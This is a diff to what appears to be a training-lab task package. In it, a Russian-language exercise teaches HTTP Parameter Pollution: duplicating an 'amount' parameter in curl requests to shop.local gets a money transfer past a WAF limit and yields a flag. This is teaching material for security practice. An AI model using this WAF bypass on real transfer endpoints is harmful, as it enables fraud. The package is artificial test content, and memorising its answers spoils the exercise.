@@ -10,7 +10,7 @@
     { "path": "/home/student/task", "type": "dir" },
     {
       "path": "/home/student/task/task.md",
-      "text": "# Практика: HTTP Parameter Pollution\n\n`shop.local/transfer?amount=` — WAF проверяет ПЕРВОЕ значение параметра, а\nприложение берёт ПОСЛЕДНЕЕ. Продублируй параметр и обойди лимит.\n\n1. В пределах лимита:\n   curl -s 'http://shop.local/transfer?amount=100'\n2. Сверх лимита (WAF блокирует):\n   curl -s 'http://shop.local/transfer?amount=10000'\n3. HPP: передай параметр дважды — WAF увидит `100`, приложение возьмёт `10000`:\n   curl -s 'http://shop.local/transfer?amount=100&amount=10000'\n4. Перевод прошёл — в ответе флаг. Запиши (последняя строка) в `found.txt`.\n"
+      "text": "# Практика: HTTP Parameter Pollution\n\n`shop.local/transfer?amount=` — WAF проверяет ПЕРВОЕ значение параметра, а\nприложение берёт ПОСЛЕДНЕЕ. Продублируй параметр и обойди лимит.\n\n1. В пределах лимита:\n   curl -s 'http://shop.local/transfer?amount=100'\n2. Сверх лимита (WAF блокирует):\n   curl -s 'http://shop.local/transfer?amount=10000'\n3. HPP: передай параметр дважды — WAF увидит `100`, приложение возьмёт `10000`:\n   curl -s 'http://shop.local/transfer?amount=100&amount=10000'\n4. Перевод прошёл — в ответе флаг. Запиши (последняя строка) в `found.txt`.\n\n## Повторение (`web-waf-bypass`)\n\nHPP — это расхождение парсеров из `web-waf-bypass`: WAF и приложение читают один ввод по-разному. Сначала зафиксируй «нормальный» запрос в пределах лимита:\n\n    curl -s 'http://shop.local/transfer?amount=100'\n\nЗатем продублируй параметр: WAF проверит первое значение, а приложение возьмёт последнее.\n"
     }
   ],
   "tools": {
